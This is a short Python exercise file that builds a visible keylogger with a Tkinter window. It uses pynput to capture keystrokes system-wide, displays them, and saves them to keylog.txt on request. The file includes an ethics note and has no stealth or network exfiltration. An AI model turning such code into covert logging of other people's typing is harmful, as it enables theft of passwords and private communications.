#TASK_04:--> Simple Keylogger
"""
Create a basic keylogger program that records and logs keystrokes. 
Focus on logging the keys pressed and saving them to a file.
Note: Ethical considerations and permissions are crucial for projects involving keyloggers.

"""

import tkinter as tk
from pynput import keyboard

class Keylogger:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Keylogger")
        self.root.geometry("300x200")
        self.label = tk.Label(self.root, text="Press 'Esc' to stop the keylogger")
        self.label.pack()
        self.text_area = tk.Text(self.root, height=10, width=40)
        self.text_area.pack()
        self.save_button = tk.Button(self.root, text="Save", command=self.save_to_file)
        self.save_button.pack()
        self.input_string = ""
        self.modifiers = []
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()

    def on_press(self, key):
        try:
            if key == keyboard.Key.esc:
                self.listener.stop()
                self.root.destroy()
            elif key == keyboard.Key.tab:
                self.input_string += " [Tab] "
            elif key == keyboard.Key.backspace:
                self.input_string = self.input_string[:-1]
            elif key == keyboard.Key.space:
                self.input_string += " "
            elif key == keyboard.Key.enter:
                self.input_string += "\n [Enter] "
            elif key in [keyboard.Key.shift_l, keyboard.Key.shift_r, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r]:
                self.modifiers.append(str(key).replace("Key.", "").replace("_l", "").replace("_r", ""))
            else:
                modifier_string = "".join(["<" + m + ">" for m in self.modifiers]) if self.modifiers else ""
                self.input_string += modifier_string + str(key).replace("Key.", "").replace("'", "")
                self.modifiers = []
            self.text_area.delete(1.0, tk.END)
            self.text_area.insert(tk.END, self.input_string)
        except Exception as e:
            print(f"Error: {e}")

    def on_release(self, key):
        pass

    def save_to_file(self):
        with open("keylog.txt", "w") as file:
            file.write(self.input_string)

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.run()
